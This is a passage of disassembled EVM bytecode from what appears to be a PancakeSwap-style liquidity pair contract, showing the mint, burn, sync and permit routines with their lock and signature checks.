0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF60 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xF74 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF8A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFDD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xFF1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1007 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1026 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1043 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1051 DUP8 DUP8 PUSH2 0x2243 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x108E JUMPI PUSH2 0x107A PUSH2 0x3E8 PUSH2 0xB60 PUSH2 0x1075 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0x23B6 JUMP JUMPDEST SWAP9 POP PUSH2 0x1089 PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2408 JUMP JUMPDEST PUSH2 0x10DD JUMP JUMPDEST PUSH2 0x10DA PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x10AB DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x10B2 JUMPI INVALID JUMPDEST DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x10CD DUP7 DUP6 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x10D4 JUMPI INVALID JUMPDEST DIV PUSH2 0x248C JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x111C JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2771 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1126 DUP11 DUP11 PUSH2 0x2408 JUMP JUMPDEST PUSH2 0x1132 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1F76 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x1162 JUMPI PUSH1 0xB SLOAD PUSH2 0x115E SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP6 SWAP1 MSTORE DUP2 MLOAD CALLER SWAP3 PUSH32 0x4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F SWAP3 DUP3 SWAP1 SUB ADD SWAP1 LOG2 POP POP PUSH1 0x1 PUSH1 0x10 SSTORE POP SWAP5 SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xE SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x1225 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 DUP2 SWAP1 SSTORE DUP1 PUSH2 0x1235 PUSH2 0xC9D JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP5 SWAP7 POP SWAP3 SWAP5 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP4 SWAP2 AND SWAP2 PUSH1 0x0 SWAP2 DUP5 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1291 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x12A5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x12BB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP3 POP PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1309 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x131D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1333 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SLOAD SWAP2 SWAP3 POP PUSH2 0x1352 DUP9 DUP9 PUSH2 0x2243 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1369 DUP5 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x1370 JUMPI INVALID JUMPDEST DIV SWAP11 POP DUP1 PUSH2 0x1384 DUP5 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x138B JUMPI INVALID JUMPDEST DIV SWAP10 POP PUSH1 0x0 DUP12 GT DUP1 ISZERO PUSH2 0x139E JUMPI POP PUSH1 0x0 DUP11 GT JUMPDEST PUSH2 0x13D9 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2708 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x13E3 ADDRESS DUP5 PUSH2 0x24A4 JUMP JUMPDEST PUSH2 0x13EE DUP8 DUP14 DUP14 PUSH2 0x1D29 JUMP JUMPDEST PUSH2 0x13F9 DUP7 DUP14 DUP13 PUSH2 0x1D29 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP10 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x143F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1453 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1469 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP7 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP9 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14B5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x14C9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x14DF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP4 POP PUSH2 0x14EF DUP6 DUP6 DUP12 DUP12 PUSH2 0x1F76 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x151F JUMPI PUSH1 0xB SLOAD PUSH2 0x151B SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP13 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP13 SWAP1 MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP16 AND SWAP3 CALLER SWAP3 PUSH32 0xDCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496 SWAP3 SWAP1 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x10 DUP2 SWAP1 SSTORE POP SWAP2 POP SWAP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xCD4 CALLER DUP5 DUP5 PUSH2 0x219B JUMP JUMPDEST PUSH2 0x3E8 DUP2 JUMP JUMPDEST PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x1619 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 SSTORE PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND SWAP5 SWAP1 SWAP4 AND SWAP3 PUSH2 0x16C8 SWAP3 DUP6 SWAP3 DUP8 SWAP3 PUSH2 0x16C3 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 DUP6 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x168B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x169F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x16B5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH2 0x1D29 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x172F SWAP3 DUP5 SWAP3 DUP8 SWAP3 PUSH2 0x16C3 SWAP3 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x168B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP PUSH1 0x1 PUSH1 0x10 SSTORE POP JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x179F JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x18BA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x18F0 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x1941 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x194C DUP10 DUP10 DUP10 PUSH2 0x2139 JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x19A2 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 DUP2 SWAP1 SSTORE DUP1 PUSH2 0x19B2 PUSH2 0xC9D JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1A06 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1A1A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1A30 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1A83 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1A97 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1AAD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1ACC DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1AE9 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1AF7 DUP8 DUP8 PUSH2 0x2243 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1B30 JUMPI PUSH2 0x1B1B PUSH2 0x3E8 PUSH2 0xB60 PUSH2 0x1075 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP9 POP PUSH2 0x1B2A PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2530 JUMP JUMPDEST POP PUSH2 0x1B50 JUMP JUMPDEST PUSH2 0x1B4D PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x10AB DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x1B8F JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x26E0 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1B99 DUP11 DUP11 PUSH2 0x2530 JUMP JUMPDEST POP PUSH2 0x1132 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1F76 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xA SLOAD DUP2 JUMP JUMPDEST PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x1C12 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 SSTORE PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x1D22 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C63 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C77 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1C8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 